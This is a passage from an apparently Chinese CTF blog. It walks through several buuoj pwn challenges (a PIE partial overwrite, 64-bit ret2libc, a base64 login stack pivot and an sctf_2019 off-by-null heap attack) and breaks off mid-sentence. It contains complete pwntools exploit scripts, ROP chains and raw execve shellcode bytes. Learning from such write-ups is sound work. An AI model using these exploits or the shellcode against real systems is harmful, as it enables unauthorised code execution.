      <link href="//posts/d23e595a/"/>
      <url>//posts/d23e595a/</url>
      
        <content type="html"><![CDATA[<h2 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee"></a>p1eee</h2><h5 id="开了pie保护"><a href="#开了pie保护" class="headerlink" title="开了pie保护"></a>开了pie保护</h5><p><img src="https://i0.imgs.ovh/2023/10/25/F3cV5.png" alt="image-20231025205617591"></p><h5 id="可以溢出一字节"><a href="#可以溢出一字节" class="headerlink" title="可以溢出一字节"></a>可以溢出一字节</h5><p><img src="https://i0.imgs.ovh/2023/10/25/F3gtX.png" alt="image-20231025210358978"></p><h5 id="还有个后门函数"><a href="#还有个后门函数" class="headerlink" title="还有个后门函数"></a>还有个后门函数</h5><p><img src="https://i0.imgs.ovh/2023/10/25/F3eks.png" alt="image-20231025210337922"></p><p>因为代码段和后门函数地址相差是非常近的，只差了一个字节，所以可以直接覆盖返回地址为后门函数地址，返回函数的地址一般都是move rbp ，rsp之类的，所以这里最后一字节改成’\x69’,改成之前的都不行。</p><p><img src="https://i0.imgs.ovh/2023/10/25/F3tNU.png" alt="image-20231025210604176"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"node4.buuoj.cn"</span>,<span class="number">29807</span>)</span><br><span class="line"><span class="comment">#p=process("./pie")</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">0x28</span>)+<span class="string">'\x69'</span></span><br><span class="line">p.sendlineafter(<span class="string">'A nice try to break pie!!!'</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h5 id="常规的64位的ret2libc题"><a href="#常规的64位的ret2libc题" class="headerlink" title="常规的64位的ret2libc题"></a>常规的64位的ret2libc题</h5><p><img src="https://i0.imgs.ovh/2023/10/30/AAzet.png" alt="image-20231026223501750"></p><h5 id="区别在于最后的payload要在p64-binsh-后面加个ret的参数"><a href="#区别在于最后的payload要在p64-binsh-后面加个ret的参数" class="headerlink" title="区别在于最后的payload要在p64(binsh)后面加个ret的参数"></a>区别在于最后的payload要在p64(binsh)后面加个ret的参数</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/10/30/AAUGm.png" alt="image-20231026223815671"></p><h5 id="libc的话write-up是推荐手动计算，但是没给具体是什么版本的libc-用题目本身的，用buu自带提供的libc-2-23-so-libc-2-27-so都是打不通的。"><a href="#libc的话write-up是推荐手动计算，但是没给具体是什么版本的libc-用题目本身的，用buu自带提供的libc-2-23-so-libc-2-27-so都是打不通的。" class="headerlink" title="libc的话write_up是推荐手动计算，但是没给具体是什么版本的libc,用题目本身的，用buu自带提供的libc-2.23.so,libc-2.27.so都是打不通的。"></a>libc的话write_up是推荐手动计算，但是没给具体是什么版本的libc,用题目本身的，用buu自带提供的libc-2.23.so,libc-2.27.so都是打不通的。</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># libc.blukat.me 查询libc版本后手动计算（推荐）</span></span><br><span class="line">libc_base &nbsp; = &nbsp; puts_addr - <span class="number">0x080970</span></span><br><span class="line">system_addr = &nbsp; libc_base + <span class="number">0x04f420b</span></span><br><span class="line">in_addr &nbsp; &nbsp;= &nbsp; libc_base + <span class="number">0x1b3d88</span></span><br></pre></td></tr></tbody></table></figure><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"node4.buuoj.cn"</span>,<span class="number">27215</span>)</span><br><span class="line"><span class="comment">#p=process("./ret2libc1")</span></span><br><span class="line">elf=ELF(<span class="string">'./ret2libc1'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('./libc-2.23.so')</span></span><br><span class="line"><span class="comment">#libc=elf.libc</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">puts_plt=<span class="number">0x400520</span></span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400763</span></span><br><span class="line">main=<span class="number">0x400698</span></span><br><span class="line">ret=<span class="number">0x4006F1</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">'again'</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'time'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"><span class="comment">#puts_addr=u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base=puts_addr-<span class="number">0x04f420</span></span><br><span class="line"><span class="comment">#-libc.sym['puts']</span></span><br><span class="line">system=base+<span class="number">0x080970</span></span><br><span class="line"><span class="comment">#libc.sym['system']</span></span><br><span class="line">binsh=base+<span class="number">0x1b3d88</span></span><br><span class="line"><span class="comment">#libc.search('bin/sh').next()</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">'again'</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-NewSar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>login</title>
      <link href="//posts/aa08cb10/"/>
      <url>//posts/aa08cb10/</url>
      
        <content type="html"><![CDATA[<h5 id="例行检查，这道题是静态的，函数多且看不懂"><a href="#例行检查，这道题是静态的，函数多且看不懂" class="headerlink" title="例行检查，这道题是静态的，函数多且看不懂"></a>例行检查，这道题是静态的，函数多且看不懂</h5><p><img src="https://i.imgs.ovh/2023/10/23/2NN33.png" alt="image-20231023205047486"></p><h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.imgs.ovh/2023/10/23/2N9ae.png" alt="image-20231023204935533"></h5><h5 id="第十五行的Base64Decode函数，参数是s-用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。"><a href="#第十五行的Base64Decode函数，参数是s-用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。" class="headerlink" title="第十五行的Base64Decode函数，参数是s,用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。"></a>第十五行的Base64Decode函数，参数是s,用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。</h5><p><img src="https://i.imgs.ovh/2023/10/23/2aClH.png" alt="image-20231023205506057"></p><h5 id="看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send-可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。"><a href="#看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send-可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。" class="headerlink" title="看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send()可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。"></a>看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send()可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。</h5><p><img src="https://i.imgs.ovh/2023/10/23/2a21s.png" alt="image-20231023210859918"></p><p><img src="https://i0.imgs.ovh/2023/10/26/Fbv9I.png" alt="image-20231026202306583"></p><h5 id="payload这样写"><a href="#payload这样写" class="headerlink" title="payload这样写"></a>payload这样写</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">'aaaa'</span>+p32(<span class="number">0x8049284</span>)+p32(<span class="number">0x811EB40</span>)</span><br><span class="line">payload=base64.b64encode(payload)</span><br></pre></td></tr></tbody></table></figure><h5 id="只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64-b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4-v4的大小是八字节，会覆盖到ebp-ebp是input的地址0x811EB40-然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp-esp-4，也就是调用correct函数的地址，然后提权"><a href="#只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64-b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4-v4的大小是八字节，会覆盖到ebp-ebp是input的地址0x811EB40-然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp-esp-4，也就是调用correct函数的地址，然后提权" class="headerlink" title="只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64.b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4,v4的大小是八字节，会覆盖到ebp,ebp是input的地址0x811EB40,然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp=esp+4，也就是调用correct函数的地址，然后提权"></a>只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64.b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4,v4的大小是八字节，会覆盖到ebp,ebp是input的地址0x811EB40,然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp=esp+4，也就是调用correct函数的地址，然后提权</h5><p><img src="https://i0.imgs.ovh/2023/10/26/Fbacj.png" alt="image-20231026205553321"></p><p><img src="https://i0.imgs.ovh/2023/10/26/FoPSJ.png" alt="image-20231026204932010"></p><p><img src="https://i0.imgs.ovh/2023/10/26/FoCMV.png" alt="image-20231026205315054"></p><p><img src="https://i0.imgs.ovh/2023/10/26/FoVdW.png" alt="image-20231026205440817"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"node4.buuoj.cn"</span>,<span class="number">29010</span>)</span><br><span class="line"><span class="comment">#p=process("./login")</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=<span class="number">0x08049284</span></span><br><span class="line">fake_addr=<span class="number">0x811eb40</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x4</span>+p32(shell)+p32(fake_addr)</span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Authenticate :'</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf_2019_easy_heap</title>
      <link href="//posts/afe33925/"/>
      <url>//posts/afe33925/</url>
      
        <content type="html"><![CDATA[<h4 id="这道题用off-by-null解"><a href="#这道题用off-by-null解" class="headerlink" title="这道题用off by null解"></a>这道题用off by null解</h4><h5 id="例行检查，保护全开-不能利用got表，只能用hook的地址"><a href="#例行检查，保护全开-不能利用got表，只能用hook的地址" class="headerlink" title="例行检查，保护全开,不能利用got表，只能用hook的地址"></a>例行检查，保护全开,不能利用got表，只能用hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/21/2tYAH.png" alt="image-20231021201805120"></p><h5 id="程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。"><a href="#程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。" class="headerlink" title="程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。"></a>程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。</h5><h5 id="mmap-函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一："><a href="#mmap-函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一：" class="headerlink" title="mmap()函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一："></a>mmap()函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一：</h5><ul><li>PROT_EXEC：允许对内存映射区域进行执行访问。</li><li>PROT_READ：允许对内存映射区域进行读取访问。</li><li>PROT_WRITE：允许对内存映射区域进行写入访问。</li><li>PROT_NONE：禁止对内存映射区域进行任何访问。</li></ul><h5 id="当权限参数的值为7时，实际上是将PROT-EXEC、PROT-READ和PROT-WRITE三个权限组合在一起，7-4-2-1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。"><a href="#当权限参数的值为7时，实际上是将PROT-EXEC、PROT-READ和PROT-WRITE三个权限组合在一起，7-4-2-1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。" class="headerlink" title="当权限参数的值为7时，实际上是将PROT_EXEC、PROT_READ和PROT_WRITE三个权限组合在一起，7=4+2+1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。"></a>当权限参数的值为7时，实际上是将PROT_EXEC、PROT_READ和PROT_WRITE三个权限组合在一起，7=4+2+1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。</h5><p><img src="https://i.imgs.ovh/2023/10/21/21wjI.png" alt="image-20231021203428599"></p><h5 id="单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数"><a href="#单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数" class="headerlink" title="单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数"></a>单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数</h5><p><img src="https://i.imgs.ovh/2023/10/21/21fLV.png" alt="image-20231021203536497"></p><h5 id=""><a href="#" class="headerlink" title=" "></a> </h5><h5 id="按照题解里的流程，先创建一个0x410大小的堆，并接收其地址-这个地址存了malloc的堆的地址"><a href="#按照题解里的流程，先创建一个0x410大小的堆，并接收其地址-这个地址存了malloc的堆的地址" class="headerlink" title="按照题解里的流程，先创建一个0x410大小的堆，并接收其地址,这个地址存了malloc的堆的地址"></a>按照题解里的流程，先创建一个0x410大小的堆，并接收其地址,这个地址存了malloc的堆的地址</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Address '</span>)</span><br><span class="line">chunk0_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/21/21ROU.png" alt="image-20231021212103375"></p><h5 id="然后再创建四个大小不同的堆"><a href="#然后再创建四个大小不同的堆" class="headerlink" title="然后再创建四个大小不同的堆"></a>然后再创建四个大小不同的堆</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/21/21glC.png" alt="image-20231021214117731"></p><h5 id="然后free掉堆0"><a href="#然后free掉堆0" class="headerlink" title="然后free掉堆0"></a>然后free掉堆0</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="然后edit堆2-也就是输入内容，构造下面的unlink"><a href="#然后edit堆2-也就是输入内容，构造下面的unlink" class="headerlink" title="然后edit堆2,也就是输入内容，构造下面的unlink"></a>然后edit堆2,也就是输入内容，构造下面的unlink</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x420</span>+<span class="number">0x20</span>+<span class="number">0x30</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/21/2JLl9.png" alt="image-20231021222737762"></p><h5 id="在free堆3后，就会unlink合并，四个堆合并在一起"><a href="#在free堆3后，就会unlink合并，四个堆合并在一起" class="headerlink" title="在free堆3后，就会unlink合并，四个堆合并在一起"></a>在free堆3后，就会unlink合并，四个堆合并在一起</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">3</span>) free堆<span class="number">3</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/21/2JXbO.png" alt="image-20231021223134709"></p><h5 id="这里存堆0，堆3的指针都被清掉了。"><a href="#这里存堆0，堆3的指针都被清掉了。" class="headerlink" title="这里存堆0，堆3的指针都被清掉了。"></a>这里存堆0，堆3的指针都被清掉了。</h5><p><img src="https://i.imgs.ovh/2023/10/21/2Jr5H.png" alt="image-20231021223200332"></p><h5 id="再free堆1，堆2"><a href="#再free堆1，堆2" class="headerlink" title="再free堆1，堆2"></a>再free堆1，堆2</h5><p><img src="https://i.imgs.ovh/2023/10/21/2JFXD.png" alt="image-20231021223634211"></p><p><img src="https://i.imgs.ovh/2023/10/21/2JABo.png" alt="image-20231021223742057"></p><h5 id="然后又malloc两次-两个大小加起来刚好是0x970-会从原来的freechunk中拿。"><a href="#然后又malloc两次-两个大小加起来刚好是0x970-会从原来的freechunk中拿。" class="headerlink" title="然后又malloc两次,两个大小加起来刚好是0x970,会从原来的freechunk中拿。"></a>然后又malloc两次,两个大小加起来刚好是0x970,会从原来的freechunk中拿。</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">0x510</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/22/25gco.png" alt="image-20231022185742061"></p><p><img src="https://i.imgs.ovh/2023/10/22/25t9A.png" alt="image-20231022185800359"></p><p><img src="https://i.imgs.ovh/2023/10/22/25JH5.png" alt="image-20231022185836223"></p><h5 id="然后编辑这两个堆的内容"><a href="#然后编辑这两个堆的内容" class="headerlink" title="然后编辑这两个堆的内容"></a>然后编辑这两个堆的内容</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0x410</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(mmap_addr+<span class="number">0x10</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">fill(<span class="number">1</span>,<span class="string">'\x30'</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="编辑完后，这是堆0的"><a href="#编辑完后，这是堆0的" class="headerlink" title="编辑完后，这是堆0的"></a>编辑完后，这是堆0的</h5><p><img src="https://i.imgs.ovh/2023/10/22/25UdX.png" alt="image-20231022190729493"></p><h5 id="成功修改了0x30的tachebin指针成mmap-10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main-arena-96这个地址。"><a href="#成功修改了0x30的tachebin指针成mmap-10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main-arena-96这个地址。" class="headerlink" title="成功修改了0x30的tachebin指针成mmap+10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main_arena+96这个地址。"></a>成功修改了0x30的tachebin指针成mmap+10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main_arena+96这个地址。</h5><p><img src="https://i.imgs.ovh/2023/10/22/25j2U.png" alt="image-20231022190804852"></p><h5 id="这是堆1的，bin指针修改成了malloc-hook的地址。"><a href="#这是堆1的，bin指针修改成了malloc-hook的地址。" class="headerlink" title="这是堆1的，bin指针修改成了malloc_hook的地址。"></a>这是堆1的，bin指针修改成了malloc_hook的地址。</h5><p><img src="https://i.imgs.ovh/2023/10/22/25yUK.png" alt="image-20231022191125950"></p><h5 id="原本的话指向main-arena-96这个地址，改掉最后的字节成0x30就是malloc-hook的地址"><a href="#原本的话指向main-arena-96这个地址，改掉最后的字节成0x30就是malloc-hook的地址" class="headerlink" title="原本的话指向main_arena+96这个地址，改掉最后的字节成0x30就是malloc_hook的地址"></a>原本的话指向main_arena+96这个地址，改掉最后的字节成0x30就是malloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/22/2YPP2.png" alt="image-20231022191235807"></p><h5 id="再malloc两次，把多余的freechunk拿掉"><a href="#再malloc两次，把多余的freechunk拿掉" class="headerlink" title="再malloc两次，把多余的freechunk拿掉"></a>再malloc两次，把多余的freechunk拿掉</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x28</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/22/2YV6j.png" alt="image-20231022191554689"></p><h5 id="再add堆5，也就是在maap-10这个地址上放shellcode，手写shellcode是真的强好吧"><a href="#再add堆5，也就是在maap-10这个地址上放shellcode，手写shellcode是真的强好吧" class="headerlink" title="再add堆5，也就是在maap+10这个地址上放shellcode，手写shellcode是真的强好吧"></a>再add堆5，也就是在maap+10这个地址上放shellcode，手写shellcode是真的强好吧</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x28</span>)<span class="comment">#5</span></span><br><span class="line">payload2 = <span class="string">b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line">fill(<span class="number">5</span>,payload2 + <span class="string">'\n'</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/22/2YLeI.png" alt="image-20231022191845126"></p><h5 id="再add堆6，大小在0x10到0x18之间才能在0x20的tachebin-malloc-hook-里申请，这里我们放上st-addr-0x10的地址，也就是maap-addr-0x10的地址。"><a href="#再add堆6，大小在0x10到0x18之间才能在0x20的tachebin-malloc-hook-里申请，这里我们放上st-addr-0x10的地址，也就是maap-addr-0x10的地址。" class="headerlink" title="再add堆6，大小在0x10到0x18之间才能在0x20的tachebin(malloc_hook)里申请，这里我们放上st_addr+0x10的地址，也就是maap_addr+0x10的地址。"></a>再add堆6，大小在0x10到0x18之间才能在0x20的tachebin(malloc_hook)里申请，这里我们放上st_addr+0x10的地址，也就是maap_addr+0x10的地址。</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">6</span>,p64(st_addr + <span class="number">0x10</span>) + <span class="string">'\n'</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/22/2YXGV.png" alt="image-20231022192746832"></p><h5 id="这是堆5和堆6的地址，也就是mmap-10的地址和malloc-hook的地址"><a href="#这是堆5和堆6的地址，也就是mmap-10的地址和malloc-hook的地址" class="headerlink" title="这是堆5和堆6的地址，也就是mmap+10的地址和malloc_hook的地址"></a>这是堆5和堆6的地址，也就是mmap+10的地址和malloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/22/2Y2MJ.png" alt="image-20231022192836650"></p><h5 id="最后，再malloc一次，就会执行malloc-hook-而这个地址就会去执行mmap-0x10这个地址，这个地址放又shellcode，成功提权。"><a href="#最后，再malloc一次，就会执行malloc-hook-而这个地址就会去执行mmap-0x10这个地址，这个地址放又shellcode，成功提权。" class="headerlink" 